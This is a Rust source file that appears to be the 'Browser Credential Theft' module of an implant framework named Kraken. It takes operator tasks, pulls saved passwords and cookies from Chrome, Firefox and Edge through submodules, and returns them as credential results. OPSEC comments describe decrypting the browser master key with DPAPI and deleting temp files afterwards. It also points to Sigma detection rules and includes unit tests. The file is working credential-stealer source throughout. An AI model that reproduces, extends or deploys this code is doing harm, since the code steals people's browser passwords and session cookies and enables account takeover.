//! mod-browser: Browser Credential Theft Module
//!
//! Extracts saved passwords, cookies, and browsing history from:
//! - Google Chrome / Chromium
//! - Mozilla Firefox
//! - Microsoft Edge (Chromium-based)
//!
//! ## MITRE ATT&CK
//! - T1555.003: Credentials from Web Browsers
//!
//! ## OPSEC
//! - Copies browser DBs to a temp file before reading (browsers lock the DB
//!   while running).
//! - Uses DPAPI to decrypt Chrome/Edge AES master key.
//! - Temp files are removed immediately after reading.
//!
//! ## Detection
//! - wiki/detection/sigma/kraken_browser_passwords.yml
//! - wiki/detection/sigma/kraken_browser_cookies.yml

use common::{
    CredentialInfo, CredentialOutput, KrakenError, Module, ModuleId, TaskId, TaskResult,
};
use prost::Message;
use protocol::{browser_task, BrowserTask};

pub mod chrome;
pub mod decrypt;
pub mod edge;
pub mod firefox;

// ── Public data types ──────────────────────────────────────────────────────

/// A single saved password entry from a browser's credential store
#[derive(Debug, Clone)]
pub struct BrowserCredential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
    pub created: i64,
    pub last_used: i64,
}

/// A single cookie entry
#[derive(Debug, Clone)]
pub struct BrowserCookie {
    pub browser: String,
    pub domain: String,
    pub name: String,
    pub value: String,
    pub expires: i64,
    pub secure: bool,
    pub http_only: bool,
}

/// Combined output for a browser extraction run
#[derive(Debug, Default)]
pub struct BrowserOutput {
    pub credentials: Vec<BrowserCredential>,
    pub cookies: Vec<BrowserCookie>,
}

// ── Module implementation ──────────────────────────────────────────────────

pub struct BrowserModule {
    id: ModuleId,
}

impl BrowserModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("browser"),
        }
    }
}

impl Default for BrowserModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for BrowserModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Browser Credential Theft"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task = BrowserTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let output = match task.operation {
            Some(browser_task::Operation::Passwords(ref req)) => {
                let browsers: Vec<&str> = req.browsers.iter().map(String::as_str).collect();
                extract_passwords(&browsers)?
            }
            Some(browser_task::Operation::Cookies(ref req)) => {
                let browsers: Vec<&str> = req.browsers.iter().map(String::as_str).collect();
                extract_cookies(&browsers)?
            }
            Some(browser_task::Operation::History(_)) => {
                // History extraction: future work
                return Err(KrakenError::Module(
                    "Browser history extraction not yet implemented".into(),
                ));
            }
            Some(browser_task::Operation::All(ref req)) => {
                let browsers: Vec<&str> = req.browsers.iter().map(String::as_str).collect();
                let mut out = extract_passwords(&browsers)?;
                out.extend(extract_cookies(&browsers)?);
                out
            }
            None => {
                return Err(KrakenError::Protocol(
                    "missing browser operation".into(),
                ));
            }
        };

        if output.is_empty() {
            return Err(KrakenError::Module("No browser data found".into()));
        }

        Ok(TaskResult::Credential(CredentialOutput {
            credentials: output,
        }))
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(BrowserModule);

// ── Extraction helpers ─────────────────────────────────────────────────────

/// Extract passwords from one or more browsers.
/// `browsers` may contain "chrome", "firefox", "edge", or "all".
fn extract_passwords(browsers: &[&str]) -> Result<Vec<CredentialInfo>, KrakenError> {
    let all = browsers.is_empty() || browsers.contains(&"all");
    let mut out = Vec::new();

    if all || browsers.contains(&"chrome") {
        if let Ok(creds) = chrome::extract_passwords() {
            out.extend(creds.into_iter().map(cred_to_info));
        }
    }
    if all || browsers.contains(&"firefox") {
        if let Ok(creds) = firefox::extract_passwords() {
            out.extend(creds.into_iter().map(cred_to_info));
        }
    }
    if all || browsers.contains(&"edge") {
        if let Ok(creds) = edge::extract_passwords() {
            out.extend(creds.into_iter().map(cred_to_info));
        }
    }

    Ok(out)
}

/// Extract cookies from one or more browsers.
fn extract_cookies(browsers: &[&str]) -> Result<Vec<CredentialInfo>, KrakenError> {
    let all = browsers.is_empty() || browsers.contains(&"all");
    let mut out = Vec::new();

    if all || browsers.contains(&"chrome") {
        if let Ok(cookies) = chrome::extract_cookies() {
            out.extend(cookies.into_iter().map(cookie_to_info));
        }
    }
    if all || browsers.contains(&"firefox") {
        if let Ok(cookies) = firefox::extract_cookies() {
            out.extend(cookies.into_iter().map(cookie_to_info));
        }
    }
    if all || browsers.contains(&"edge") {
        if let Ok(cookies) = edge::extract_cookies() {
            out.extend(cookies.into_iter().map(cookie_to_info));
        }
    }

    Ok(out)
}

fn cred_to_info(c: BrowserCredential) -> CredentialInfo {
    CredentialInfo {
        credential_type: "browser_password".to_string(),
        domain: c.url,
        username: c.username,
        data: c.password,
        source: c.browser,
    }
}

fn cookie_to_info(c: BrowserCookie) -> CredentialInfo {
    CredentialInfo {
        credential_type: "browser_cookie".to_string(),
        domain: c.domain,
        username: c.name,
        data: c.value,
        source: c.browser,
    }
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = BrowserModule::new();
        assert_eq!(module.id().as_str(), "browser");
        assert_eq!(module.name(), "Browser Credential Theft");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = BrowserModule::new();
        // Malformed protobuf should return a protocol error
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE, 0xFD]);
        assert!(result.is_err());
    }

    #[test]
    fn test_empty_task_data() {
        let module = BrowserModule::new();
        // Empty proto decodes to default BrowserTask (no operation set)
        let result = module.handle(TaskId::new(), &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_cred_to_info_mapping() {
        let cred = BrowserCredential {
            browser: "chrome".to_string(),
            url: "https://example.com".to_string(),
            username: "user@example.com".to_string(),
            password: "secret".to_string(),
            created: 1_000_000,
            last_used: 2_000_000,
        };
        let info = cred_to_info(cred);
        assert_eq!(info.credential_type, "browser_password");
        assert_eq!(info.domain, "https://example.com");
        assert_eq!(info.username, "user@example.com");
        assert_eq!(info.data, "secret");
        assert_eq!(info.source, "chrome");
    }

    #[test]
    fn test_cookie_to_info_mapping() {
        let cookie = BrowserCookie {
            browser: "firefox".to_string(),
            domain: "example.com".to_string(),
            name: "session_id".to_string(),
            value: "abc123".to_string(),
            expires: 9_999_999,
            secure: true,
            http_only: true,
        };
        let info = cookie_to_info(cookie);
        assert_eq!(info.credential_type, "browser_cookie");
        assert_eq!(info.domain, "example.com");
        assert_eq!(info.username, "session_id");
        assert_eq!(info.data, "abc123");
        assert_eq!(info.source, "firefox");
    }
}
